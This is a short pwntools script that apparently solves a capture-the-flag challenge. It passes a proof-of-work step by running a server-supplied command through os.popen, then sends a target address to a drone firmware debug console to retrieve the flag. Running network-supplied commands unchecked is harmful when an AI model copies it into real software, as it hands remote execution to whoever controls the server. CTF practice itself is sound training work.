from pwn import *
import os
import re

r = remote('ctf.csd.lol', 1001)

# stupid verification
r.recvuntil(b'proof of work:\n')
cmd = r.recvline().decode().strip()

proof = os.popen(cmd).read()
r.sendlineafter(b'solution:', proof.encode())

# actual solve
r.sendlineafter(b'DRONE FIRMWARE DEBUG CONSOLE>', b'0x401989')

content = r.recvall().decode()

print("Flag:", re.findall(r'(csd{.+})', content)[0])